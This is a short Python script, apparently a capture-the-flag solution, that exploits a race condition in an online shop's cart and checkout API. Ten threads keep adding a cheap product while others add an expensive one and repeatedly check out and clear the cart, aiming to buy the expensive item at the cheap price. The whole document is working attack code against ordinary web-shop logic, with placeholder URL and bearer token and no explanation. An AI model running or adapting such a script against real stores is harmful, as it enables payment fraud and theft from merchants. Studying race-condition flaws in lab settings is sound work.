from requests import post, delete
import threading

url = "http://URL"
token = "TOKEN"
N = 10


class AddCheapProduct(threading.Thread):
    def run(self):
        while True:
            print("[adding/cheap-product]")
            post(f"{url}/cart", headers={"Authorization": f"Bearer {token}"}, data={"id": "0", "quantity": "1"}).json()


class AddExpensiveProduct(threading.Thread):
    def run(self):
        while True:
            print("[adding/cheap-product]")
            post(f"{url}/cart", headers={"Authorization": f"Bearer {token}"}, data={"id": "5", "quantity": "1"}).json()


class CheckoutProduct(threading.Thread):
    def run(self):
        while True:
            resp = post(f"{url}/checkout", headers={"Authorization": f"Bearer {token}"}).json()
            print("[checkout/product]", resp)
            delete(f"{url}/cart", headers={"Authorization": f"Bearer {token}"}).json()


if __name__ == "__main__":
    expensive_product = AddExpensiveProduct()
    checkout_product = CheckoutProduct()

    expensive_product.start()
    checkout_product.start()

    flags = []
    for _ in range(N):
        flags.append(AddCheapProduct())
        flags[-1].start()
